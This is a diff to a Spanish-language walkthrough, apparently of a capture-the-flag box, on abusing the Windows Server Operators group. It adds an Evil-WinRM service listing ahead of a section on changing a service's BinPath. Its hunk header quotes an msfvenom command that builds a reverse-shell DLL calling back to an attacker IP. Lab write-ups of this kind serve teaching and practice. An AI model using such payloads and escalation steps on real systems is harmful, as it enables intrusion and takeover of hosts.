@@ -63,6 +63,30 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f dll -o p
 
 ## Abuso del grupo Server Operators
 
+### Listar servicios
+
+```null
+*Evil-WinRM* PS C:\Users\jorden\Documents> services
+
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                           True aspnet_state     
+\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5EB04B3D-85AE-4574-88FB-F22CF32D39F5}\MpKslDrv.sys       True MpKslDrv         
+"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER                          True MSSQLSERVER      
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
+"C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"                                                     True SQLBrowser       
+"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER                         True SQLSERVERAGENT   
+"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service                                True SQLTELEMETRY     
+"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"                                                            True SQLWriter        
+C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
+"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
+"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
+"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\NisSrv.exe"                                              True WdNisSvc         
+"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\MsMpEng.exe"
+```
+
 ### Modificación del BinPath de un servicio
 
 ```null
